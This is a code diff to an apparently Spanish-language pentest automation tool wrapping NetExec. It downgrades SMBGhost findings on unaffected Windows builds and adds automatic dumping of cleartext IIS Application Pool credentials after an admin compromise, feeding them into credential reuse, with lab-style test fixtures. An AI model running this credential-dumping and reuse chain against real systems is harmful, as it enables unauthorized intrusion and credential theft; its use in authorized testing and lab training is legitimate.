@@ -3288,11 +3288,34 @@ def fp_smb(ip, ports, services, host, deep, base=None):
         _step(res, f"{nxc} smb {ip} -u '' -p '' -M smbghost", vulngh, outgh,
               note="CVE-2020-0796 (SMBGhost): ¿dialecto SMB 3.1.1 con compresión activada? Comprobación de solo lectura, SIN credenciales")
         if vulngh:
-            _ghost_txt = (
-                "SMB: SMBGhost (CVE-2020-0796, CVSS 10.0 — el máximo posible) — POTENCIALMENTE VULNERABLE "
-                "(dialecto 3.1.1 + compresión activada, comprobado sin credenciales): RCE sin autenticar "
-                "(wormable) o LPE local")
-            res["findings"].append(("critica", _ghost_txt))
+            # BUG real corregido aquí (operador real: build 20348 = Server 2022 mostró el mismo
+            # "Potentially vulnerable" de nxc, pero el PoC real de RCE (chompie1337) falló limpio
+            # con "physical read primitive failed" — el target NO era vulnerable de verdad). El
+            # check de nxc (y el scanner de ly4k) solo confirma dialecto SMB 3.1.1 + compresión
+            # activada — una PRECONDICIÓN necesaria pero NO suficiente (su propio README lo dice:
+            # "checks for SMB dialect 3.1.1 and compression capability"), no que el código
+            # vulnerable de srv2.sys siga sin parchear. CVE-2020-0796 solo afectó oficialmente a
+            # build 18362/18363 (Windows 10 y Server, ambos 1903/1909) — cualquier otro build
+            # (más antiguo o más moderno, parcheado desde marzo de 2020) sigue anunciando
+            # compresión por protocolo sin tener el hueco de memoria que el PoC necesita. Con el
+            # build detectado (rdp-ntlm-info/smb-os-discovery, ver _detect_win_build) FUERA de ese
+            # rango, se baja la severidad y se avisa explícitamente en vez de dar "CVSS 10.0" por
+            # sentado.
+            _wbuild = _detect_win_build(services, host)
+            _ghost_vulnerable_build = _wbuild is None or _wbuild in (18362, 18363)
+            if _ghost_vulnerable_build:
+                _ghost_txt = (
+                    "SMB: SMBGhost (CVE-2020-0796, CVSS 10.0 — el máximo posible) — POTENCIALMENTE VULNERABLE "
+                    "(dialecto 3.1.1 + compresión activada, comprobado sin credenciales): RCE sin autenticar "
+                    "(wormable) o LPE local")
+                res["findings"].append(("critica", _ghost_txt))
+            else:
+                _ghost_txt = (
+                    f"SMB: SMBGhost (CVE-2020-0796) — dialecto 3.1.1 + compresión activada (precondición del "
+                    f"check), pero el build detectado ({_wbuild}) está FUERA del único rango realmente "
+                    "vulnerable (18362/18363, Windows 10 y Server 1903/1909) — casi seguro NO explotable de "
+                    "verdad pese al aviso de nxc; confírmalo con el PoC real antes de darlo por crítico")
+                res["findings"].append(("media", _ghost_txt))
             # Bug real reportado (operador): el quick win de este hallazgo enseñaba un 'nxc smb
             # --users --groups --pass-pol --rid-brute' sin relación, porque el CVE del hallazgo
             # (CVE-2020-0796) no aparecía en el texto del propio next-step de abajo — el
@@ -7416,6 +7439,33 @@ _LSASSY_HASH_RE = re.compile(r"^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$")
 # — self.save_dir es una ruta LOCAL (en tu máquina, NXC_PATH/modules/lsassy por defecto), no en el objetivo.
 _LSASSY_TICKETS_RE = re.compile(r"Saved (\d+) Kerberos ticket\(s\) to (\S.*)$")
 
+# execute_appcmd() de nxc/modules/iis.py: context.log.highlight(f"Username: {username}, Password:
+# {password}") o, sin contraseña, context.log.highlight(f"Username: {username} - User Does Not
+# Have A Password") — sin prefijo de estado (igual que lsassy, ver _parse_lsassy). Las líneas
+# '[+] Credentials Found for APPPOOL: ...'/'[-] appcmd.exe not found.../No credentials found :('
+# son log.success()/log.fail() (SÍ llevan '[...]' — descartadas aquí, mismo bug real que ya
+# corrigió _parse_lsassy: un banner de estado nunca es una credencial real).
+_IIS_CRED_RE = re.compile(r"^Username:\s*(.+?)(?:,\s*Password:\s*(.*)|\s*-\s*User Does Not Have A Password)$")
+
+
+def _parse_iis_appcmd(out):
+    """Credenciales de Application Pools de IIS volcadas por `nxc smb ... -M iis`. Formato
+    confirmado contra el código fuente real del módulo (nxc/modules/iis.py). Devuelve
+    [(usuario, secreto_o_cadena_vacía)]. Puro → testeable sin red."""
+    creds = []
+    for raw_line in (out or "").splitlines():
+        line = raw_line.rstrip()
+        if not line.strip():
+            continue
+        m = _LSASSY_PREFIX_RE.match(line)
+        payload = m.group(1) if m else line
+        if payload.startswith("["):   # banner de estado de nxc (log.success/log.fail), nunca una credencial
+            continue
+        cm = _IIS_CRED_RE.match(payload)
+        if cm:
+            creds.append((cm.group(1).strip(), (cm.group(2) or "").strip()))
+    return creds
+
 
 def _parse_lsassy(out):
     """Credenciales de sesiones ACTIVAS volcadas por `nxc smb ... -M lsassy` (memoria de
@@ -7629,6 +7679,34 @@ def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_h
             res["next"].append(
                 f"ls -la {tk_path}   # lsassy volcó {n_tk} ticket(s) Kerberos de la sesión activa en {ip} "
                 "(guardados en TU máquina, no en el objetivo)")
+
+        # iis: credenciales EN CLARO de los Application Pools de IIS (appcmd.exe list apppool
+        # /@t:*) — un fallo de higiene clásico (cuentas de servicio con contraseña en el XML de
+        # configuración de IIS). Formato confirmado contra el código fuente real del módulo
+        # (nxc/modules/iis.py): si no hay IIS/appcmd.exe, falla limpio ("not applicable"), igual
+        # de barato que --lsa/-M lsassy cuando no hay nada que sacar — se lanza siempre tras un
+        # Pwn3d!, sin precondición propia que comprobar antes (operator-asked: "he visto uno de
+        # iis también").
+        rc4, out4 = run_capture(base_cmd + ["-M", "iis"], timeout=60, quiet=True)
+        out4 = out4 or ""
+        iis_creds = _parse_iis_appcmd(out4)
+        safe_out4 = _mask_out(out4, p)
+        _step(res, shown_base + " -M iis", bool(iis_creds), safe_out4,
+              note="Pwn3d! por SMB → credenciales en claro de los Application Pools de IIS (appcmd.exe), "
+                   "si el equipo tiene IIS instalado")
+        for user, secret in iis_creds:
+            if secret:
+                res["findings"].append(("critica",
+                    f"IIS: credencial en TEXTO CLARO de un Application Pool — «{user}:{secret}»   "
+                    "# probarla en otros servicios (--creds-file)"))
+            else:
+                res["findings"].append(("media",
+                    f"IIS: Application Pool corre como «{user}» SIN contraseña (cuenta integrada o mal configurada)"))
+        if pool is not None:
+            for user, secret in iis_creds:
+                if secret:
+                    bare = re.split(r"[\\/]", user)[-1]
+                    _pool_add(pool, bare, secret, False)
     finally:
         if pw_file:
             try:
@@ -12509,6 +12587,22 @@ def selftest():
     _lsa_banner_out = "SMB  10.0.0.1  445  DC01  [-] SOUPEDECODE.LOCAL\\Administrator:garbage STATUS_LOGON_FAILURE\n"
     assert _parse_nxc_lsa(_lsa_banner_out)["creds"] == []
 
+    # _parse_iis_appcmd: formato real de nxc/modules/iis.py (execute_appcmd) — credencial en
+    # claro, cuenta sin contraseña, y los banners de éxito/fallo del propio nxc (que SÍ llevan
+    # '[...]', a diferencia de la línea real del módulo) no deben colarse como credencial.
+    _iis_out = (
+        "SMB  10.0.0.1  445  DC01  [*] Checking For Hidden Credentials With Appcmd.exe\n"
+        "SMB  10.0.0.1  445  DC01  [+] Credentials Found for APPPOOL: DefaultAppPool\n"
+        "SMB  10.0.0.1  445  DC01  Username: IIS_AppPoolUser, Password: AppP0ol_S3cret!\n"
+        "SMB  10.0.0.1  445  DC01  [+] Credentials Found for APPPOOL: ClassicAppPool\n"
+        "SMB  10.0.0.1  445  DC01  Username: svc_iis - User Does Not Have A Password\n"
+    )
+    assert _parse_iis_appcmd(_iis_out) == [
+        ("IIS_AppPoolUser", "AppP0ol_S3cret!"), ("svc_iis", "")]
+    assert _parse_iis_appcmd("SMB  10.0.0.1  445  DC01  [-] No credentials found :(\n") == []
+    assert _parse_iis_appcmd("SMB  10.0.0.1  445  DC01  [-] appcmd.exe not found, this module is not applicable - x\n") == []
+    assert _parse_iis_appcmd("") == []
+
     # roasting (nxc --asreproast/--kerberoasting) y spider de contenido: parsers puros (sin red)
     assert _count_roast("$krb5asrep$23$u@DOM:abc\n$krb5tgs$23$*svc$DOM$def") == 2
     assert _count_roast("sin hashes") == 0
@@ -12908,6 +13002,26 @@ def selftest():
     # siguiente bloque de test, que reproduce el bug real reportado con quick_wins() de verdad).
     _ghost_t = next(t for s, t in _vres["findings"] if s == "critica" and "SMBGhost" in t)
     assert len(_vres.get("_cmd_for", {}).get(_ghost_t, [])) == 3, _vres.get("_cmd_for")
+
+    # Regresión REAL (operador real: build 20348 = Server 2022 dio el mismo aviso de nxc, pero el
+    # PoC real de RCE falló limpio con "physical read primitive failed" — el check de nxc/el
+    # scanner de ly4k solo confirma dialecto 3.1.1 + compresión, NO el código vulnerable sin
+    # parchear, y CVE-2020-0796 SOLO afectó a los builds 18362/18363). Con el build detectado
+    # (smb-os-discovery, vía _detect_win_build) FUERA de ese rango, la severidad baja a 'media' y
+    # el texto avisa explícitamente en vez de dar un CVSS 10.0 por sentado.
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_vuln_rc
+    try:
+        _vres_patched = fp_smb("10.0.0.1", [{"port": 445}], [{"port": 445, "name": "smb", "scripts": {}}],
+                               {"smb-os-discovery": "OS: Windows Server 2022 Standard 20348"}, False)
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_v, _real_rc_v
+    assert not any(s == "critica" and "SMBGhost" in t for s, t in _vres_patched["findings"]), _vres_patched["findings"]
+    assert any(s == "media" and "CVE-2020-0796" in t and "20348" in t
+               and "FUERA del único rango realmente vulnerable" in t
+               for s, t in _vres_patched["findings"]), _vres_patched["findings"]
+    # los next-steps (confirmar + los 2 PoC) se siguen dando igual, aunque la severidad baje —
+    # el operador puede querer verificarlo de todos modos, el texto ya deja clara la duda.
+    assert any("SMBGhost/scanner.py" in n for n in _vres_patched["next"]), _vres_patched["next"]
 
     # Regresión (operador real, en vivo): el quick win de SMBGhost enseñaba un 'nxc smb ... --users
     # --groups --pass-pol --rid-brute' SIN relación, porque el CVE del hallazgo no aparecía en el
@@ -13666,6 +13780,8 @@ def selftest():
             return 0, _lsa_out
         if "-M" in cmd and "lsassy" in cmd:
             return 0, "SMB  10.129.4.104  445  FRONTDESK01  No credentials found\n"
+        if "-M" in cmd and "iis" in cmd:
+            return 0, "SMB  10.129.4.104  445  FRONTDESK01  [-] appcmd.exe not found, this module is not applicable\n"
         raise AssertionError(f"comando nxc inesperado en _dump_sam_lsa: {cmd}")
 
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
@@ -13674,7 +13790,7 @@ def selftest():
         _dump_sam_lsa(_dres, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!")
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
-    assert len(_dump_cmds) == 3 and all("--local-auth" not in c for c in _dump_cmds)   # --sam/--lsa/-M lsassy
+    assert len(_dump_cmds) == 4 and all("--local-auth" not in c for c in _dump_cmds)   # --sam/--lsa/-M lsassy/-M iis
     assert all("HTB_@cademy_stdnt!" not in " ".join(c) for c in _dump_cmds)   # la contraseña nunca va en el argv
     _dsteps_out = " ".join(s["output"] for s in _dres["steps"])
     assert "HTB_@cademy_stdnt!" in _dsteps_out   # la contraseña del operador, en claro por defecto
@@ -13768,6 +13884,8 @@ def selftest():
             return 0, ("SMB  10.129.4.104  445  FRONTDESK01  No credentials found\n"
                         "SMB  10.129.4.104  445  FRONTDESK01  [-] [OPSEC] Failed to delete lsassy dumper file: "
                         "C$\\Windows\\Temp\\xyz123.tmp\n")
+        if "-M" in cmd and "iis" in cmd:
+            return 0, "SMB  10.129.4.104  445  FRONTDESK01  [-] appcmd.exe not found, this module is not applicable\n"
         raise AssertionError(f"comando inesperado: {cmd}")
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_opsec
     try:
@@ -13799,6 +13917,8 @@ def selftest():
             return 0, _lsa_real
         if "-M" in cmd and "lsassy" in cmd:
             return 0, _lsassy_out   # mssqlsvc en claro + jmontgomery solo con hash (fixture ya definido arriba)
+        if "-M" in cmd and "iis" in cmd:
+            return 0, "SMB  172.16.6.50  445  MS01  [-] appcmd.exe not found, this module is not applicable\n"
         raise AssertionError(f"comando inesperado: {cmd}")
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_real
     _pool_real, _dres_real = [], _fp("reuse", "t", [445])
@@ -14176,7 +14296,7 @@ def selftest():
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
         globals()["_run_capture_progressive"] = _real_rcp_bulk
-    assert len(_seen_cmds) == 9   # 1 spray + 3 del volcado SAM/LSA/-M lsassy + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
+    assert len(_seen_cmds) == 10   # 1 spray + 4 del volcado SAM/LSA/-M lsassy/-M iis + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
     _cmd, _timeout, _quiet = _seen_cmds[0]
     assert _quiet is True and "--continue-on-success" in _cmd and "--no-bruteforce" not in _cmd
     assert _timeout and _timeout > 0
@@ -14209,10 +14329,10 @@ def selftest():
                                     bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], False))
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
-    # 1 bulk + 3 del volcado encadenado (alice: --sam/--lsa/-M lsassy) + 5 de _creds_enum (alice:
-    # --shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1 explícito
-    # de "dave" ("dave" no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
-    assert len(_mix[0]["steps"]) == 10
+    # 1 bulk + 4 del volcado encadenado (alice: --sam/--lsa/-M lsassy/-M iis) + 5 de _creds_enum
+    # (alice: --shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1
+    # explícito de "dave" ("dave" no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
+    assert len(_mix[0]["steps"]) == 11
 
     # Orden de protocolos (_CREDS_PROTO_PRIORITY): SMB y LDAP antes que WMI (más lento y con un
     # bug confirmado de nxc contra listas de usuarios) y que WinRM/RDP/MSSQL, sea el orden de
